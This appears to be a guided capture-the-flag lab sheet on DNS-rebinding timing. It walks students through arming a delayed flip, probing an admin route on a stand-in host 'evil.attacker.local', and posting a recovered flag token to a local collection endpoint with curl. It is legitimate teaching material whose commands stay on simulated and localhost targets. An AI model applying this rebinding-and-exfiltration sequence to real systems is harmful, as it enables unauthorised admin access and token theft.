# Activity 2: Delayed Flip and Exfiltration (Guided)

## Objective

Reproduce time-based rebinding behavior by arming a delayed flip and validating token collection through the exfiltration sink.

This is the DNS-rebinding timing variant from the original plan. Burp is not required.

## Workflow

1. Enter workspace:
	`cd /home/labDirectory`
2. Arm delayed flip threshold:
	`labfctl arm 3`
3. Probe the same route repeatedly:
	`fetch-sim evil.attacker.local /admin`
	`fetch-sim evil.attacker.local /admin`
	`fetch-sim evil.attacker.local /admin`
4. On/after threshold, recover `IITB{...}` token.
5. Exfiltrate token (either via browser button or CLI):
	`curl -s -X POST http://127.0.0.1:8084/collect -d 'token=IITB{...}&source=manual'`
6. Verify evidence:
	`labfctl logs exfil`
7. Submit token in:
	`SUBMIT_FLAG.txt`

## Observability

- Browser console: `http://127.0.0.1:8080`
- Routing evidence: `labfctl logs proxy`

## Submission

- Submit only `SUBMIT_FLAG.txt`.
